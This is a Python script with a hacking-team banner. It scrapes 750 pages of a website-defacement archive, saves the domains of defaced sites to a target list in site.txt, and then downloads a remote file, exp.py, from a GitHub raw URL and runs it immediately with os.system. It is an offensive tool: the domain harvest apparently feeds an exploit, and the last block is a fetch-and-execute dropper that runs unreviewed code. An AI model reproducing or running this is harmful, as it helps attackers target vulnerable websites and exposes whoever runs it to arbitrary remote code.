import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import os
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

banner = f"""
         .-.
       .'   `.          \033[96m--------------------------------
       :g g   :         \033[96m| GHOSTNET - VIETNAM - TEAM    |
       : o    `.        \033[96m|    @CODE BY DUCTUYENDEV      |
      :         ``.     \033[96m--------------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:' 
           :              `.
            `.              `.     .  
              `'`'`'`---..,___`;.-'
""" 

clear()
print(banner)

url_template = 'https://defacer.net/archive/{}'
urls = set()
total = 0

with open('site.txt', 'w') as file:
    for page in range(1, 751):
        response = requests.get(url_template.format(page))
        soup = BeautifulSoup(response.text, 'html.parser')

        for text in soup.stripped_strings:
            if '.' in text and not text.startswith(('http://', 'https://')):
                text = 'http://' + text

            parsed_url = urlparse(text)
            domain_parts = parsed_url.netloc.split(':')[0].split('.')
            domain_name = '.'.join(domain_parts[-2:]) if len(domain_parts) >= 2 else parsed_url.netloc

            if domain_name and domain_name not in urls:
                urls.add(domain_name)
                total += 1
                file.write(domain_name + '\n')
                sys.stdout.write(f"\033[32msucess:\033[35m {domain_name} \033[31m::\033[32m total:\033[35m {total} \033[31m::\033[32m save in site.txt\033[0m\n")
                sys.stdout.flush()

# Tải và chạy file từ GitHub
github_url = "https://raw.githubusercontent.com/Dangductuyen/gop/refs/heads/main/exp.py"
try:
    response = requests.get(github_url)
    if response.status_code == 200:
        with open('exp.py', 'w', encoding='utf-8') as f:
            f.write(response.text)
        print("\n\033[32m[*] Đã tải xong exp.py. Đang chạy file...\033[0m\n")
        os.system('python exp.py')
    else:
        print(f"\n\033[31m[!] Không thể tải file exp.py, mã lỗi {response.status_code}\033[0m\n")
except Exception as e:
    print(f"\n\033[31m[!] Lỗi khi tải hoặc chạy file exp.py: {e}\033[0m\n")
